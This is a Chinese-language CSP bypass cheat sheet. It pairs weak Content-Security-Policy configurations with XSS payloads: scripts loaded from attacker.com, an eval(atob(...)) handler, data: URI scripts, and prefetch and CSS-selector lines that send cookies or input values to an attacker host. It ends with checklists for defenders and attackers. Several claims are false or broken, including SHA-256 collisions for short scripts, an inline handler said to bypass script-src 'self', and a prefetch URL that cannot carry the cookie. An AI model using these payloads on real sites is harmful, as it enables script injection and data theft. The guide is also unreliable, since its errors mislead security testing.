# CSP(内容安全策略)绕过秘笈

## 不完整的CSP指令

### 缺少script-src指令
```
CSP: default-src 'self'; style-src 'unsafe-inline'

漏洞：
- 仅default-src受限
- script-src未明确声明，默认为default-src
- 但某些浏览器可能允许内联脚本或unsafe sources

绕过：
<script>alert('XSS')</script>
```

### 过于宽松的指令
```
CSP: script-src 'self' https:; object-src 'none'

问题：
- https: 允许任何HTTPS来源
- 攻击者可控制https://attacker.com的内容

绕过：
<script src="https://attacker.com/payload.js"></script>
```

## 白名单中的可信源绕过

### 弱白名单
```
CSP: script-src 'self' https://cdn.example.com

如果cdn.example.com允许用户上传内容：
1. 攻击者上传evil.js到CDN
2. 在目标页面注入：<script src="https://cdn.example.com/evil.js"></script>
```

### 子域名通配符
```
CSP: script-src https://*.example.com

如果有子域名允许用户提交内容：
- https://uploads.example.com/file.js
- https://user-content.example.com/payload.js

都被允许
```

### CDN中的open redirect
```
CSP: script-src https://cdn.example.com

如果CDN有open redirect：
https://cdn.example.com/redirect?url=https://attacker.com/payload.js

某些CSP实现跟随重定向
```

## Base64和Data URI绕过

### 内联脚本Base64编码
```html
<!-- 原始CSP禁止内联脚本 -->
CSP: script-src 'self'

<!-- Data URI绕过 -->
<img src="x" onerror="eval(atob('YWxlcnQoIlhTUyIp'))">
<!-- base64解码后: alert("XSS") -->
```

### Data URI直接执行
```html
<!-- 如果CSP允许data: -->
CSP: script-src 'self' data:

<!-- 直接data URI -->
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycpOw=="></script>
```

## 链接预加载和资源泄露

### 链接预加载泄露数据
```html
<!-- CSP不禁止link的href属性 -->
<link rel="prefetch" href="https://attacker.com/?cookie=document.cookie">

<!-- 浏览器会尝试连接并泄露Cookie -->
```

### DNS预解析
```html
<link rel="dns-prefetch" href="//attacker.com/?data=SECRET">
```

### 字体加载侧通道
```html
<!-- 加载特殊字体，如果字体包含特定字符会加载特定资源 -->
<!-- 攻击者可推断出字符内容 -->
```

## Content-Security-Policy-Report-Only绕过

### 报告端点攻击
```
CSP-Report-Only: ...;report-uri=https://target.com/csp-report

如果report-uri可被攻击者控制：
- 攻击者获得CSP违反信息
- 或使用report-uri进行redirect攻击
```

## fetch/XHR与CORS交互

### 预检请求绕过
```
CSP: connect-src 'self'

但某些简单请求（GET/POST with form-data）不触发预检

绕过：
fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'data=value'
})
// Content-Type allowed的简单请求不需CORS预检
```

## 样式注入(Styling Side Channels)

### CSS属性选择器
```css
/* 虽然无法执行JavaScript，但可通过样式推断内容 */
input[value*="a"] { background: url(https://attacker.com/a); }
input[value*="b"] { background: url(https://attacker.com/b); }

/* 根据CSS请求，攻击者知道input的值 */
```

## Nonce和Hash绕过

### Nonce不随机
```
CSP: script-src 'nonce-abc123'

如果nonce不随机（如时间戳、用户ID）：

攻击者可预测nonce
```

### Hash碰撞
```
CSP: script-src 'sha256-xyz...'

如果script很短，某些多个不同脚本可产生相同hash
```

## 快速定位和利用

**关键词识别**：
- Content-Security-Policy头
- 缺少script-src或过于宽松
- 允许 'unsafe-inline' 或 'unsafe-eval'
- 白名单包含用户上传的来源
- 使用Report-Only而非强制CSP

**CSP分析工具**：
- CSP Evaluator (Google)
- CSP LINTER
- 浏览器开发工具

**测试优先级**：
1. 分析CSP指令的完整性
2. 测试内联脚本执行
3. 测试data: URI
4. 枚举白名单中的可信源
5. 测试资源预加载/DNS泄露

## CSP绕过检查清单

**对于防御者**：
- ✓ 明确指定script-src和默认来源
- ✓ 禁用'unsafe-inline'和'unsafe-eval'
- ✓ 使用nonce或hash而非信任来源列表
- ✓ 严格限制白名单（避免通配符）
- ✓ 定期审查和更新CSP策略
- ✓ 监控CSP报告中的违反事件
- ✓ 测试CSP有效性

**对于攻击者**：
- 分析CSP头中的弱点
- 寻找可信源中的可利用资源
- 测试inline、eval等限制
- 利用资源预加载泄露信息
